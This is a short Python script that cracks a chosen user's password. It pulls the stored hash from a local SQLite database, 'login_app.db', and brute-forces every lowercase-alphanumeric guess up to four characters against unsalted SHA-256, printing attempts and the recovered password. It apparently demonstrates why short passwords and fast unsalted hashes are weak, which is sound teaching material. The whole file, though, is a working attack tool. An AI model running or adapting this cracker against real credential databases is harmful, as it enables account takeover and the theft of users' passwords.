import sqlite3
import hashlib
import itertools
import string
import time

DB_FILE = "login_app.db"
CHARSET = string.ascii_lowercase + string.digits  # a-z + 0-9
MAX_LENGTH = 4  # how long passwords to try

# ========== GET STORED HASH FOR USER ==========
def get_password_hash_for_user(username):
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    cur.execute("SELECT password FROM users WHERE username=?", (username,))
    result = cur.fetchone()
    conn.close()
    if result:
        return result[0]
    return None

# ========== HASH GUESS ==========
def hash_password(pwd):
    return hashlib.sha256(pwd.encode()).hexdigest()

# ========== BRUTE FORCE ATTACK ==========
def brute_force_attack(username):
    target_hash = get_password_hash_for_user(username)
    if not target_hash:
        print(f"❌ User '{username}' not found in database.")
        return

    print(f"🔓 Starting brute force on user: {username}")
    print(f"💣 Target Hash: {target_hash[:10]}...\n")

    attempts = 0
    start_time = time.time()

    for length in range(1, MAX_LENGTH + 1):
        for attempt in itertools.product(CHARSET, repeat=length):
            guess = ''.join(attempt)
            attempts += 1
            guess_hash = hash_password(guess)

            print(f"Trying: {guess:<6} | Attempts: {attempts}", end="\r")

            if guess_hash == target_hash:   
                elapsed = round(time.time() - start_time, 2)
                print(f"\n✅ PASSWORD FOUND: {guess}")
                print(f"🕒 Time: {elapsed}s | 🔁 Attempts: {attempts}")
                return

    print("\n❌ Failed to crack the password.")
    print(f"🔁 Total Attempts: {attempts}")

# ========== RUN ==========
if __name__ == "__main__":
    username = input("Enter username to attack: ")
    brute_force_attack(username)
